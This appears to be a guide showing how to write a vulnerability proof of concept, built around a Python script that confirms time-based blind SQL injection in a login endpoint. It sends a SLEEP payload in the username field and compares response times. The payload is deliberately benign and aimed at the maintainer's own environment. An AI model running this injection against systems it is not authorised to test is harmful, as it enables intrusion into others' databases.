# Example: SQL Injection PoC (Python Script)

This example demonstrates the preferred **Python script approach** for web application
vulnerabilities. It uses a time-based blind technique with `sleep()` as the benign
payload.

**Scenario:** A login endpoint is vulnerable to time-based blind SQL injection in the
`username` parameter. The application uses MySQL.

**Approach:** Mono-flow Python script with click and loguru.

```python
#!/usr/bin/env python3
"""
Title:     Time-based blind SQL injection in login endpoint
Affected:  POST /api/login (auth-service v3.2.0, username parameter)
Impact:    Extract database contents via boolean/time oracle
Author:    researcher
"""

import time
import click
import requests
from loguru import logger

SLEEP_SECONDS = 5
TIMING_THRESHOLD = 4.0  # response must be at least this slow to confirm


@click.command()
@click.option("--target", default="http://localhost:8080", help="Base URL of target")
def main(target: str) -> None:
    endpoint = f"{target}/api/login"

    # == [ Build Payload ] ==
    baseline_data = {"username": "admin", "password": "test"}
    payload_data = {
        "username": f"admin' OR SLEEP({SLEEP_SECONDS})-- -",
        "password": "test",
    }

    # == [ Execute — Baseline ] ==
    logger.info("Sending baseline request...")
    t0 = time.time()
    try:
        requests.post(endpoint, data=baseline_data, timeout=30)
    except requests.ConnectionError:
        logger.error(f"Cannot connect to {endpoint}")
        raise SystemExit(1)
    baseline_time = time.time() - t0
    logger.info(f"Baseline response time: {baseline_time:.2f}s")

    # == [ Execute — Payload ] ==
    logger.info(f"Sending payload (expecting ~{SLEEP_SECONDS}s delay)...")
    t0 = time.time()
    requests.post(endpoint, data=payload_data, timeout=30)
    payload_time = time.time() - t0
    logger.info(f"Payload response time: {payload_time:.2f}s")

    # == [ Verify Impact ] ==
    delay = payload_time - baseline_time
    if delay >= TIMING_THRESHOLD:
        logger.success(
            f"[+] Vulnerability confirmed: {delay:.2f}s additional delay "
            f"(expected ~{SLEEP_SECONDS}s)"
        )
    else:
        logger.warning(
            f"[-] Target does not appear vulnerable "
            f"(only {delay:.2f}s difference)"
        )
        raise SystemExit(1)


if __name__ == "__main__":
    main()
```

## Why This PoC Works

- **Parameterized target.** `--target` flag defaults to localhost. The maintainer runs
  `python poc.py --target http://staging:8080` against their own environment.
- **Benign payload.** Uses `SLEEP()` — no data is exfiltrated, no tables are modified.
  The only observable effect is a time delay.
- **Baseline comparison.** Measures normal response time first, then compares against the
  injected delay. This eliminates false positives from slow networks.
- **Clear success/failure output.** `[+]` with measured delay vs `[-]` with explanation.
  A triager can read the output without understanding SQL injection.
- **Minimal dependencies.** Only `requests`, `click`, and `loguru` — all standard in
  security tooling. No exotic libraries.
- **Mono-flow simplicity.** Two requests and a time comparison. The minimum needed to
  prove the injection exists.
